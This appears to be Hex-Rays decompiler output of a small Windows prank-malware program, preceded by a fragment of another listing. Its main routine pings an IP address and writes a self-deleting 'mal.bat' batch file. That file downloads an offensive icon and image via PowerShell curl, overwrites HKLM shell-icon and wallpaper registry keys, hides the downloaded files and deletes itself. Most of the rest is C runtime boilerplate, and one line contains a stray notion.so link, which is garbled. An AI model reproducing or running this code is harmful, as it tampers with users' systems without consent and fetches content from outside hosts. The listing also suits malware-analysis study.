_fwrite(""REG ADD \""HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons\"" /v \""3\"" /t REG_EXPAND_SZ /d C:\\Windows\\system32\\imageres.dll,28 /f \n""
,1,0x9f,_File);
_fwrite(""REG ADD \""HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons\"" /v \""4\"" /t REG_EXPAND_SZ /d C:\\Windows\\system32\\imageres.dll,28 /f \n""
,1,0x9f,_File);
_fwrite(""RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters"",1,0x35,_File);
_fclose(_File);
_system(""start mal.bat"");
_Sleep_4(1000);
_system(""del mal.bat"");
return 0;
}","/* This file was generated by the Hex-Rays decompiler version 8.3.0.230608.
Copyright (c) 2007-2021 Hex-Rays mailto:info@hex-rays.com
Detected compiler: GNU C++
*/
#include <windows.h>
#include <defs.h>
#include <stdarg.h>
//-------------------------------------------------------------------------
// Function declarations
LONG __stdcall TopLevelExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo); // idb
void __noreturn sub_4011B0();
int _mingw32_init_mainargs();
void __noreturn mainCRTStartup(); // weak
void __noreturn WinMainCRTStartup(); // weak
// int __cdecl atexit(void (__cdecl *)());
int __gcc_register_frame();
void __cdecl __gcc_deregister_frame(); // idb
int onlineVersion();
int offlineVersion();
int __cdecl main(int argc, const char **argv, const char **envp);
char **_setargv();
// unsigned int __usercall __cpu_features_init@<eax>(__int32 a1@<ebp>);
void __cdecl __do_global_dtors(); // idb
int __do_global_ctors();
int __main();
int __stdcall TlsCallback_1(int a1, int a2, int a3);
int __stdcall __dyn_tls_init(int a1, int a2, int a3);
int __tlregdtor();
void sub_401E80();
int __cdecl ___w64_mingwthr_add_key_dtor(int a1, int a2);
int __cdecl ___w64_mingwthr_remove_key_dtor(int a1);
int __cdecl __mingw_TLScallback(int a1, int a2);
void __noreturn sub_4020B0(char *Format, ...);
// void *__usercall sub_402100@<eax>(size_t Size@<ecx>, void *Src@<edx>, void *lpAddress@<eax>);
int _pei386_runtime_relocator();
int __cdecl fesetenv(const fenv_t *Env);
// int __usercall sub_402460@<eax>(char *a1@<eax>, unsigned int a2@<edx>);
// int __usercall sub_402500@<eax>(_DWORD *a1@<eax>);
// char *__usercall sub_402570@<eax>(char *a1@<eax>, int a2@<edx>, __int16 a3@<cx>);
// int __usercall sub_402830@<eax>(char *a1@<eax>, _BYTE *a2@<edx>, unsigned int a3@<ecx>);
// int __usercall sub_402A50@<eax>(int a1@<eax>, int a2@<edx>);
// void __usercall sub_402AB0(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>);
// int __usercall sub_402B00@<eax>(const char *a1@<eax>, unsigned int a2@<edx>, int a3@<ecx>, int a4);
int *__cdecl __mingw_glob(char *Str, int a2, int a3, char **a4);
void __cdecl __mingw_globfree(void *a1);
char *__cdecl __mingw_dirname(char *Source);
// HANDLE __usercall sub_4038E0@<eax>(const CHAR *lpFileName@<eax>, int a2@<edx>);
// BOOL __usercall sub_4039B0@<eax>(void *hFindFile@<eax>, int a2@<edx>);
int __cdecl __mingw_opendir(char *Path); // idb
BOOL __cdecl __mingw_readdir(int a1);
int __cdecl __mingw_closedir(HANDLE *Block);
_DWORD *__cdecl __mingw_rewinddir(int a1);
int __cdecl __mingw_telldir(int a1);
int *__cdecl __mingw_seekdir(int a1, int a2);
// size_t __cdecl wcstombs(char *Dest, const wchar_t *Source, size_t MaxCount);
// int __cdecl vfprintf(FILE *const Stream, const char *const Format, va_list ArgList);
// int __cdecl tolower(int C);
// int __cdecl system(const char *Command);
// size_t __cdecl strlen(const char *Str);
// char *__cdecl strerror(int ErrorMessage);
// int __cdecl strcoll(const char *String1, const char *String2);
// _crt_signal_t __cdecl signal(int Signal, _crt_signal_t Function);
// char *__cdecl setlocale(int Category, const char *Locale);
// void *__cdecl realloc(void *Block, size_t Size);
// int __cdecl puts(const char *Buffer);
// int printf(const char *const Format, ...);
// void *__cdecl memcpy(void *, const void *Src, size_t Size);
// size_t __cdecl mbstowcs(wchar_t *Dest, const char *Source, size_t MaxCount);
// void *__cdecl malloc(size_t Size);
// size_t __cdecl fwrite(const void *Buffer, size_t ElementSize, size_t ElementCount, FILE *Stream);
// void __cdecl free(void *Block);
// int fprintf(FILE *const Stream, const char *const Format, ...);
// FILE *__cdecl fopen(const char *FileName, const char *Mode);
// int __cdecl fclose(FILE *Stream);
// void __cdecl __noreturn exit(int Code);
// void *__cdecl calloc(size_t Count, size_t Size);
// void __cdecl __noreturn abort();
// int __cdecl _setmode(int FileHandle, int Mode);
// int __cdecl _isctype(int C, int Type);
// char *__cdecl _fullpath(char *Buffer, const char *Path, size_t BufferCount);
// int *__cdecl _errno();
// void __cdecl _cexit();
// int *__cdecl __p__fmode();
// char ***__cdecl __p__environ();
// int __cdecl __getmainargs(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// SIZE_T __stdcall VirtualQuery(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
// BOOL __stdcall VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// LPVOID __stdcall TlsGetValue(DWORD dwTlsIndex);
// void __stdcall Sleep(DWORD dwMilliseconds);
// LPTOP_LEVEL_EXCEPTION_FILTER __stdcall SetUnhandledExceptionFilter(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// void __stdcall LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// void __stdcall InitializeCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// DWORD __stdcall GetVersion();
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// DWORD __stdcall GetLastError();
// LPSTR __stdcall GetCommandLineA();
// BOOL __stdcall FreeLibrary(HMODULE hLibModule);
// BOOL __stdcall FindNextFileA(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
// HANDLE __stdcall FindFirstFileA(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
// BOOL __stdcall FindClose(HANDLE hFindFile);
// void __stdcall __noreturn ExitProcess(UINT uExitCode);
// void __stdcall EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// void __stdcall DeleteCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// int __cdecl stricoll(const char *String1, const char *String2);
// char *__cdecl strdup(const char *String);
int register_frame_ctor();
//-------------------------------------------------------------------------
// Data declarations
func_ptr CTOR_LIST[] = { (func_ptr)0xFFFFFFFF }; // idb
int (_cdecl *data_start)(_DWORD) = NULL; // weak
int _CRT_glob = 2; // weak
fenv_t *_CRT_fenv = (fenv_t *)0xFFFFFFFD; // idb
int _fmode = 16384;
int (*off_404010)[24] = &dword_403FA0; // weak
int dword_404014 = -1; // weak
int JCR_END = 0; // weak
int (__stdcall *__dyn_tls_init_callback)(_DWORD, _DWORD, _DWORD) = &__dyn_tls_init; // weak
const char Locale[2] = { '\0', '\0' }; // idb
_UNKNOWN EH_FRAME_BEGIN; // weak
char **_argv; // idb
int _argc; // idb
_UNKNOWN obj; // weak
int _CRT_fmode; // idb
int __cpu_features; // weak
int dword_407028; // weak
int dword_40703C; // weak
int dword_407040; // weak
struct _RTL_CRITICAL_SECTION CriticalSection; // idb
int dword_40705C; // weak
int _CRT_MT; // weak
void *Block; // idb
HMODULE hmod_libgcc; // idb
// extern int ___mb_cur_max;
// extern void (__cdecl *___set_app_type)(_crt_app_type Type);
// extern void (__cdecl *__fpreset)();
// extern FILE __iob[];
// extern const unsigned __int16 *__pctype;
//----- (00401000) --------------------------------------------------------
LONG __stdcall TopLevelExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo)
{
DWORD ExceptionCode; // eax
_crt_signal_t v2; // eax
_crt_signal_t v4; // eax
_crt_signal_t v5; // eax
ExceptionCode = ExceptionInfo->ExceptionRecord->ExceptionCode;
if ( ExceptionCode > 0xC0000091 )
{
if ( ExceptionCode == -1073741676 )
{
v4 = signal(8, 0);
if ( v4 == (_crt_signal_t)1 )
{
signal(8, (_crt_signal_t)1);
return -1;
}
LABEL_11:
if ( !v4 )
return 0;
v4(8);
return -1;
}
if ( ExceptionCode == -1073741674 )
{
LABEL_16:
v5 = signal(4, 0);
if ( v5 == (_crt_signal_t)1 )
{
signal(4, (_crt_signal_t)1);
return -1;
}
else
{
if ( !v5 )
return 0;
v5(4);
return -1;
}
}
if ( ExceptionCode != -1073741677 )
return 0;
LABEL_10:
v4 = signal(8, 0);
if ( v4 == (_crt_signal_t)1 )
{
signal(8, (_crt_signal_t)1);
fesetenv(0);
return -1;
}
goto LABEL_11;
}
if ( ExceptionCode >= 0xC000008D )
goto LABEL_10;
if ( ExceptionCode != -1073741819 )
{
if ( ExceptionCode != -1073741795 )
return 0;
goto LABEL_16;
}
v2 = signal(11, 0);
if ( v2 == (_crt_signal_t)1 )
{
signal(11, (_crt_signal_t)1);
return -1;
}
else
{
if ( !v2 )
return 0;
v2(11);
return -1;
}
}
//----- (004011B0) --------------------------------------------------------
void __noreturn sub_4011B0()
{
char ***v0; // eax
int v1; // ebx
int savedregs; // [esp+18h] [ebp+0h] BYREF
if ( __dyn_tls_init_callback )
__dyn_tls_init_callback(0, 2, 0);
SetUnhandledExceptionFilter(TopLevelExceptionFilter);
__cpu_features_init((__int32)&savedregs);
fesetenv(_CRT_fenv);
_setargv();
if ( _CRT_fmode )
{
_fmode = _CRT_fmode;
_setmode(__iob[0]._file, _CRT_fmode);
_setmode(__iob[1]._file, _CRT_fmode);
_setmode(__iob[2]._file, _CRT_fmode);
}
*__p__fmode() = _fmode;
_pei386_runtime_relocator();
__main();
v0 = __p__environ();
v1 = main(_argc, (const char **)_argv, (const char **)*v0);
_cexit();
ExitProcess(v1);
}
// 405778: using guessed type int (__stdcall *__dyn_tls_init_callback)(_DWORD, _DWORD, _DWORD);
//----- (004012A0) --------------------------------------------------------
int _mingw32_init_mainargs()
{
char v1[4]; // [esp+28h] [ebp-14h] BYREF
int v2[4]; // [esp+2Ch] [ebp-10h] BYREF
v2[0] = 0;
return __getmainargs(&_argc, &_argv, v1, _CRT_glob & 1, v2);
}
// 403EC0: using guessed type int __cdecl __getmainargs(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 404004: using guessed type int _CRT_glob;
// 4012A0: using guessed type int var_10[4];
// 4012A0: using guessed type char var_14[4];
//----- (004012E0) --------------------------------------------------------
void __noreturn mainCRTStartup()
{
___set_app_type(_crt_console_app);
sub_4011B0();
}
// 4012E0: using guessed type void __noreturn mainCRTStartup();
//----- (00401300) --------------------------------------------------------
void __noreturn WinMainCRTStartup()
{
___set_app_type(_crt_gui_app);
sub_4011B0();
}
// 401300: using guessed type void __noreturn WinMainCRTStartup();
//----- (00401340) --------------------------------------------------------
int __gcc_register_frame()
{
HMODULE ModuleHandleA; // eax
HMODULE v1; // ebx
FARPROC __register_frame_info; // esi
HMODULE v3; // eax
FARPROC _Jv_RegisterClasses; // edx
ModuleHandleA = GetModuleHandleA(""libgcc_s_dw2-1.dll"");
if ( ModuleHandleA )
{
v1 = ModuleHandleA;
hmod_libgcc = LoadLibraryA(""libgcc_s_dw2-1.dll"");
__register_frame_info = GetProcAddress(v1, ""_register_frame_info"");
data_start = (int (__cdecl *)(_DWORD))GetProcAddress(v1, ""_deregister_frame_info"");
}
else
{
data_start = 0;
__register_frame_info = 0;
}
if ( __register_frame_info )
((void (__cdecl *)(void *, void *))__register_frame_info)(&EH_FRAME_BEGIN, &obj);
if ( JCR_END )
{
v3 = GetModuleHandleA(""libgcj-16.dll"");
_Jv_RegisterClasses = 0;
if ( v3 )
_Jv_RegisterClasses = GetProcAddress(v3, ""_Jv_RegisterClasses"");
if ( _Jv_RegisterClasses )
((void (__cdecl *)(int *))_Jv_RegisterClasses)(&JCR_END);
}
return atexit(__gcc_deregister_frame);
}
// 404000: using guessed type int (_cdecl *data_start)(_DWORD);
// 404018: using guessed type int JCR_END;
//----- (00401430) --------------------------------------------------------
void __cdecl gcc_deregister_frame()
{
if ( data_start )
data_start(&EH_FRAME_BEGIN);
if ( hmod_libgcc )
FreeLibrary(hmod_libgcc);
}
// 404000: using guessed type int (cdecl *data_start)(DWORD);
//----- (00401460) --------------------------------------------------------
int onlineVersion()
{
int *v0; // eax
char *v1; // eax
FILE *Stream; // [esp+1Ch] [ebp-Ch]
Stream = fopen(""mal.bat"", ""w+"");
if ( !Stream )
{
puts(""womp"");
v0 = errno();
v1 = strerror(*v0);
printf(""%s"", v1);
exit(1);
}
fwrite(""setlocal enabledelayedexpansion \n"", 1u, 0x21u, Stream);
fwrite(
""set iconLink=http://www.iconarchive.com/download/i108459/google/noto-emoji-people-bodyparts/11947-middle-finger-ligh""
""t-skin-tone.ico \n"",
1u,
0x85u,
Stream);
fwrite(
""set imageLink=http://icons.iconarchive.com/icons/google/noto-emoji-people-bodyparts/1024/11947-middle-finger-light-s""
""kin-tone-icon.png \n"",
1u,
0x87u,
Stream);
fprintf(Stream, ""start powershell curl \""%%iconLink%% -o malIcon.ico\"" \n"");
fprintf(Stream, ""start powershell curl \""%%imageLink%% -o malImage.png\"" \n"");
fprintf(Stream, ""set \""targ1=%%cd%%\\malIcon.ico\"" \n"");
fprintf(Stream, ""set \""targ2=%%cd%%\\malImage.png\"" \n"");
fwrite(
""REG ADD \""HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons\"" /v /f \n"",
1u,
0x63u,
Stream);
fprintf(
Stream,
""REG ADD \""HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons\"" /v \""3\"" /t REG""
""EXPAND_SZ /d %%targ1%% /f \n"");
fprintf(
Stream,
""REG ADD \""HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons\"" /v \""4\"" /t REG""
""EXPAND_SZ /d %%targ1%% /f \n"");
fprintf(Stream, ""REG ADD \""HKEY_CURRENT_USER\\Control Panel\\Desktop\"" /v Wallpaper /t REG_SZ /d %%targ2%% /f \n"");
fprintf(
Stream,
""REG ADD \""HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Desktop\\General\"" /v Wallpaper /t REG_SZ /d %%targ2%% /f \n"");
fwrite(""RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters"", 1u, 0x35u, Stream);
fclose(Stream);
system(""start mal.bat"");
system(""attrib +h malIcon.ico"");
system(""attrib +h malImage.ico"");
system(""attrib +h malProg.exe"");
system(""del mal.bat"");
return 0;
}
//----- (0040164F) --------------------------------------------------------
int offlineVersion()
{
int *v0; // eax
char *v1; // eax
FILE *Stream; // [esp+1Ch] [ebp-Ch]
Stream = fopen(""mal.bat"", ""w+"");
if ( !Stream )
{
puts(""womp"");
v0 = errno();
v1 = strerror(*v0);
printf(""%s"", v1);
exit(1);
}
fwrite(
""REG ADD \""HKEY_CURRENT_USER\\Control Panel\\Desktop\"" /v Wallpaper /t REG_SZ /d \""255 247 8\"" /f \n"",
1u,
0x5Cu,
Stream);
fwrite(
""REG ADD \""HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Desktop\\General\"" /v Wallpaper /t REG_SZ /d \""""
""255 247 8\"" /f \n"",
1u,
0x7Bu,
Stream);
fwrite(
""REG ADD \""HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons\"" /v /f \n"",
1u,
0x63u,
Stream);
fwrite(
""REG ADD \""HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons\"" /v \""3\"" /t REG""
""EXPAND_SZ /d C:\\Windows\\system32\\imageres.dll,28 /f \n"",
1u,
0x9Fu,
Stream);
fwrite(
""REG ADD \""HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons\"" /v \""4\"" /t REG""
""EXPAND_SZ /d C:\\Windows\\system32\\imageres.dll,28 /f \n"",
1u,
0x9Fu,
Stream);
fwrite(""RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters"", 1u, 0x35u, Stream);
fclose(Stream);
system(""start mal.bat"");
Sleep(0x3E8u);
system(""del mal.bat"");
return 0;
}
//----- (004017B4) --------------------------------------------------------
int __cdecl main(int argc, const char **argv, const char **envp)
{
__int16 Version; // [esp+1Ch] [ebp-4h]
__main();
Version = GetVersion();
if ( (unsigned __int8)Version <= 5u || HIBYTE(Version) <= 1u || system(""ping 45.33.40.23 -c 1"") )
offlineVersion();
else
onlineVersion();
return 0;
}
//----- (00401840) --------------------------------------------------------
char **_setargv()
{
const char *CommandLineA; // esi
int v1; // eax
void *v2; // esp
void *v3; // esp
char *v4; // edx
int v5; // eax
int v6; // ecx
char v7; // bl
char *v8; // ecx
char *v9; // eax
char **result; // eax
int v11; // edi
bool v12; // cl
int v13; // edi
char *v14; // eax
char *v15; // edi
char *v16; // ecx
int v17; // ebx
char *v18; // edi
int v19; // [esp+0h] [ebp-58h] BYREF
_BYTE v20[8]; // [esp+10h] [ebp-48h] BYREF
int v21; // [esp+18h] [ebp-40h]
int *v22; // [esp+1Ch] [ebp-3Ch]
int v23; // [esp+20h] [ebp-38h]
char *Str; // [esp+24h] [ebp-34h]
int v25; // [esp+28h] [ebp-30h]
int v26; // [esp+2Ch] [ebp-2Ch]
int v27[2]; // [esp+30h] [ebp-28h] BYREF
char **v28; // [esp+38h] [ebp-20h]
int v29; // [esp+3Ch] [ebp-1Ch]
if ( (_CRT_glob & 2) == 0 )
return (char **)_mingw32_init_mainargs();
v22 = &v19;
CommandLineA = GetCommandLineA();
v1 = 16 * ((2 * strlen(CommandLineA) + 17) >> 4);
v2 = alloca(v1);
v3 = alloca(v1);
v29 = 0;
v26 = 0;
v25 = 0;
v4 = v20;
Str = v20;
v23 = _CRT_glob & 0x4400 | 0x10;
v5 = 0;
LABEL_3:
while ( 1 )
{
v6 = *CommandLineA++;
v7 = *(CommandLineA - 1);
if ( !v7 )
break;
while ( 1 )
{
if ( v7 == 63 )
goto LABEL_40;
if ( v7 > 63 )
{
switch ( v7 )
{
case '\\':
if ( v26 == 39 )
*v4++ = 92;
else
++v5;
goto LABEL_3;
case '\x7F':
goto LABEL_40;
case '[':
if ( (_CRT_glob & 0x20) != 0 )
{
LABEL_40:
v11 = v5 - 1;
if ( v5 )
{
v12 = v26 != 0 || v6 == 127;
goto LABEL_26;
}
v12 = v26 != 0 || v6 == 127;
v14 = v4;
LABEL_28:
if ( v12 )
{
v4 = v14;
goto LABEL_31;
}
}
else
{
v11 = v5 - 1;
v12 = 1;
if ( v5 )
{
LABEL_26:
v13 = (int)&v4[v11 + 1];
v14 = v4;
do
*v14++ = 92;
while ( v14 != (char *)v13 );
goto LABEL_28;
}
LABEL_31:
v14 = v4 + 1;
*v4 = 127;
}
v4 = v14 + 1;
*v14 = v7;
v5 = 0;
goto LABEL_3;
}
LABEL_32:
v15 = &v4[v5];
if ( v5 )
{
do
*v4++ = 92;
while ( v4 != v15 );
}
else
{
v15 = v4;
}
if ( v26 )
{
LABEL_39:
v4 = v15 + 1;
*v15 = v7;
v5 = 0;
goto LABEL_3;
}
if ( ___mb_cur_max == 1 )
{
if ( (__pctype[v6] & 0x40) == 0 )
goto LABEL_38;
}
else
{
v21 = v6;
if ( !_isctype(v6, 64) )
{
v6 = v21;
LABEL_38:
if ( v6 != 9 )
goto LABEL_39;
}
}
if ( Str < v15 || v25 )
{
*v15 = 0;
v17 = v23;
v18 = Str;
__mingw_glob(Str, v23, 0, (char **)v27);
v4 = v18;
v25 = 0;
v23 = v17 | 1;
v5 = 0;
}
else
{
v4 = v15;
v5 = 0;
v25 = 0;
}
goto LABEL_3;
}
if ( v7 == 39 )
break;
if ( v7 == 42 )
goto LABEL_40;
if ( v7 != 34 )
goto LABEL_32;
if ( v5 >> 1 )
{
v8 = &v4[v5 >> 1];
do
*v4++ = 92;
while ( v4 != v8 );
}
else
{
v8 = v4;
}
if ( v26 == 39 || (v5 & 1) != 0 )
{
v4 = v8 + 1;
*v8 = 34;
v5 = 0;
v25 = 1;
goto LABEL_3;
}
++CommandLineA;
v4 = v8;
v26 ^= 0x22u;
v6 = *(CommandLineA - 1);
v5 = 0;
v25 = 1;
v7 = v6;
if ( !v6 )
goto LABEL_15;
}
if ( (_CRT_glob & 0x10) == 0 )
goto LABEL_32;
if ( v5 >> 1 )
{
v16 = &v4[v5 >> 1];
do
*v4++ = 92;
while ( v4 != v16 );
}
else
{
v16 = v4;
}
if ( v26 == 34 || (v5 & 1) != 0 )
{
v4 = v16 + 1;
*v16 = 39;
v5 = 0;
v25 = 1;
}
else
{
v26 ^= 0x27u;
v4 = v16;
v5 = 0;
v25 = 1;
}
}
LABEL_15:
if ( v5 )
{
v9 = &v4[v5];
do
*v4++ = 92;
while ( v4 != v9 );
}
else
{
v9 = v4;
}
if ( Str < v9 || v25 )
{
*v9 = 0;
__mingw_glob(Str, v23, 0, (char **)v27);
}
_argc = v27[1];
result = v28;
_argv = v28;
return result;
}
// 404004: using guessed type int _CRT_glob;
//----- (00401BE0) --------------------------------------------------------
unsigned int __usercall __cpu_features_init@<eax>(__int32 a1@<ebp>)
{
unsigned int v1; // kr00_4
unsigned int v2; // kr04_4
unsigned int v3; // kr08_4
unsigned int result; // eax
int v14; // eax
__int32 v15; // ebx
__int32 v16; // ebx
int v26[50]; // [esp+0h] [ebp-208h] BYREF
__int32 v27[79]; // [esp+C8h] [ebp-140h] BYREF
unsigned int v28; // [esp+204h] [ebp-4h]
v1 = __getcallerseflags();
v28 = v1;
v2 = __readeflags();
__writeeflags(v2 ^ 0x200000);
v3 = __readeflags();
__writeeflags(v28);
result = v2 ^ v3;
if ( ((v2 ^ v3) & 0x200000) != 0 )
{
_EAX = 0;
__asm { cpuid }
if ( result )
{
_EAX = 1;
__asm { cpuid }
v14 = (_EDX & 0x100) != 0;
if ( (_ECX & 0x2000) != 0 )
v14 |= 0x80u;
if ( (_EDX & 0x8000) != 0 )
v14 |= 2u;
if ( (_EDX & 0x800000) != 0 )
v14 |= 4u;
if ( (_EDX & 0x1000000) != 0 )
{
v14 |= 8u;
v27[78] = a1;
_fxsave(v26);
v15 = v27[0];
v27[0] ^= 0x13C0DEu;
_fxrstor(v26);
v27[0] = v15;
_fxsave(v26);
v16 = _InterlockedExchange(v27, v15);
_fxrstor(v26);
if ( (v27[0] ^ v16) == 1294558 )
{
if ( (_EDX & 0x2000000) != 0 )
v14 |= 0x10u;
if ( (_EDX & 0x4000000) != 0 )
v14 |= 0x20u;
if ( (_ECX & 1) != 0 )
v14 |= 0x40u;
}
}
__cpu_features = v14;
_EAX = 0x80000000;
__asm { cpuid }
if ( result > 0x80000000 )
{
_EAX = -2147483647;
__asm { cpuid }
result = 0;
if ( _EDX < 0 )
result = 256;
if ( (_EDX & 0x40000000) != 0 )
result |= 0x200u;
__cpu_features |= result;
}
}
}
return result;
}
// 401BE0: could not find valid save-restore pair for ebp
// 407024: using guessed type int __cpu_features;
// 401BE0: using guessed type __int32 var_140[79];
//----- (00401CF0) --------------------------------------------------------
void __cdecl __do_global_dtors()
{
void (v0)(void); // eax
v0 = (void ()(void))(*off_404010)[0];
if ( (off_404010)[0] )
{
do
{
v0();
v0 = (void ()(void))(off_404010)[1];
off_404010 = (int ()[24])((char *)off_404010 + 4);
}
while ( v0 );
}
}
// 404010: using guessed type int (*off_404010)[24];
//----- (00401D20) --------------------------------------------------------
int __do_global_ctors()
{
func_ptr i; // ebx
i = CTOR_LIST[0];
if ( CTOR_LIST[0] == (func_ptr)-1 )
{
for ( i = 0; CTOR_LIST[(_DWORD)i + 1]; i = (func_ptr)((char *)i + 1) )
;
}
for ( ; i; i = (func_ptr)((char *)i - 1) )
CTOR_LISTnotion://www.notion.so/Data-985bbecd5af14a66a3136a617e61750a;
return atexit(__do_global_dtors);
}
//----- (00401D70) --------------------------------------------------------
int __main()
{
int result; // eax
result = dword_407028;
if ( !dword_407028 )
{
dword_407028 = 1;
return __do_global_ctors();
}
return result;
}
// 407028: using guessed type int dword_407028;
//----- (00401D90) --------------------------------------------------------
int __stdcall TlsCallback_1(int a1, int a2, int a3)
{
if ( a2 != 3 && a2 )
return 1;
__mingw_TLScallback(a1, a2);
return 1;
}
//----- (00401DE0) --------------------------------------------------------
int __stdcall __dyn_tls_init(int a1, int a2, int a3)
{
if ( _CRT_MT != 2 )
_CRT_MT = 2;
if ( a2 == 1 )
__mingw_TLScallback(a1, 1);
return 1;
}
// 407064: using guessed type int _CRT_MT;
//----- (00401E70) --------------------------------------------------------
int __tlregdtor()
{
return 0;
}
//----- (00401E80) --------------------------------------------------------
void sub_401E80()
{
int i; // ebx
LPVOID Value; // esi
EnterCriticalSection(&CriticalSection);
for ( i = dword_40703C; i; i = *(_DWORD )(i + 8) )
{
Value = TlsGetValue((_DWORD )i);
if ( !GetLastError() && Value )
((void (__cdecl **)(LPVOID))(i + 4))(Value);
}
LeaveCriticalSection(&CriticalSection);
}
// 40703C: using guessed type int dword_40703C;
//----- (00401EE0) --------------------------------------------------------
int __cdecl ___w64_mingwthr_add_key_dtor(int a1, int a2)
{
int v2; // esi
_DWORD *v4; // eax
int v5; // ebx
int v6; // eax
v2 = 0;
if ( !dword_407040 )
return v2;
v4 = calloc(1u, 0xCu);
v5 = (int)v4;
if ( !v4 )
return -1;
*v4 = a1;
v4[1] = a2;
EnterCriticalSection(&CriticalSection);
v6 = dword_40703C;
dword_40703C = v5;
*(_DWORD *)(v5 + 8) = v6;
LeaveCriticalSection(&CriticalSection);
return 0;
}
// 40703C: using guessed type int dword_40703C;
// 407040: using guessed type int dword_407040;
//----- (00401F70) --------------------------------------------------------
int __cdecl ___w64_mingwthr_remove_key_dtor(int a1)
{
int v2; // edx
_DWORD *v3; // eax
if ( !dword_407040 )
return 0;
EnterCriticalSection(&CriticalSection);
v2 = dword_40703C;
if ( dword_40703C )
{
if ( a1 == *(_DWORD *)dword_40703C )
{
dword_40703C = *(_DWORD *)(dword_40703C + 8);
v3 = (_DWORD *)v2;
LABEL_12:
free(v3);
LeaveCriticalSection(&CriticalSection);
return 0;
}
while ( 1 )
{
v3 = *(_DWORD **)(v2 + 8);
if ( !v3 )
break;
if ( *v3 == a1 )
{
*(_DWORD *)(v2 + 8) = v3[2];
goto LABEL_12;
}
v2 = *(_DWORD *)(v2 + 8);
}
}
LeaveCriticalSection(&CriticalSection);
return 0;
}
// 40703C: using guessed type int dword_40703C;
// 407040: using guessed type int dword_407040;
//----- (00402010) --------------------------------------------------------
int __cdecl __mingw_TLScallback(int a1, int a2)
{
if ( a2 == 1 )
{
if ( !dword_407040 )
InitializeCriticalSection(&CriticalSection);
dword_407040 = 1;
return 1;
}
else
{
if ( a2 )
{
if ( a2 == 3 )
{
if ( dword_407040 )
sub_401E80();
}
}
else
{
if ( dword_407040 )
sub_401E80();
if ( dword_407040 == 1 )
{
dword_407040 = 0;
DeleteCriticalSection(&CriticalSection);
}
}
return 1;
}
}
// 407040: using guessed type int dword_407040;
//----- (004020B0) --------------------------------------------------------
void __noreturn sub_4020B0(char *Format, ...)
{
va_list va; // [esp+24h] [ebp+8h] BYREF
va_start(va, Format);
fwrite(""Mingw runtime failure:\n"", 1u, 0x17u, &__iob[2]);
vfprintf(&__iob[2], Format, va);
abort();
}
//----- (00402100) --------------------------------------------------------
void *__usercall sub_402100@<eax>(size_t Size@<ecx>, void *Src@<edx>, void *lpAddress@<eax>)
{
void *result; // eax
DWORD Protect; // [esp+1Ch] [ebp-40h]
DWORD flOldProtect; // [esp+20h] [ebp-3Ch] BYREF
struct _MEMORY_BASIC_INFORMATION Buffer; // [esp+24h] [ebp-38h] BYREF
if ( !VirtualQuery(lpAddress, &Buffer, 0x1Cu) )
sub_4020B0("" VirtualQuery failed for %d bytes at address %p"", 28, lpAddress);
if ( Buffer.Protect == 64 || Buffer.Protect == 4 )
return memcpy(lpAddress, Src, Size);
VirtualProtect(Buffer.BaseAddress, Buffer.RegionSize, 0x40u, &flOldProtect);
Protect = Buffer.Protect;
result = memcpy(lpAddress, Src, Size);
if ( Protect != 64 && Protect != 4 )
return (void *)VirtualProtect(Buffer.BaseAddress, Buffer.RegionSize, flOldProtect, &flOldProtect);
return result;
}
//----- (004021F0) --------------------------------------------------------
int _pei386_runtime_relocator()
{
int result; // eax
result = dword_40705C;
if ( !dword_40705C )
{
dword_40705C = 1;
return 0;
}
return result;
}
// 4021F0: could not find valid save-restore pair for ebx
// 4021F0: could not find valid save-restore pair for edi
// 4021F0: could not find valid save-restore pair for esi
// 40705C: using guessed type int dword_40705C;
//----- (004023F0) --------------------------------------------------------
int __cdecl fesetenv(const fenv_t *Env)
{
unsigned int Fe_stat_low; // [esp+Ch] [ebp-10h]
_EAX = Env;
Fe_stat_low = 8064;
if ( Env == (const fenv_t *)-3 )
{
dword_404014 = -1;
goto LABEL_12;
}
if ( Env != (const fenv_t *)-4 )
{
if ( !Env )
_EAX = (const fenv_t *)dword_404014;
if ( _EAX != (const fenv_t *)-1 )
{
if ( _EAX != (const fenv_t *)-2 )
{
__asm { fldenv byte ptr [eax] }
Fe_stat_low = LOWORD(_EAX[3]._Fe_stat);
goto LABEL_8;
}
goto LABEL_14;
}
LABEL_12:
__asm { fninit }
goto LABEL_8;
}
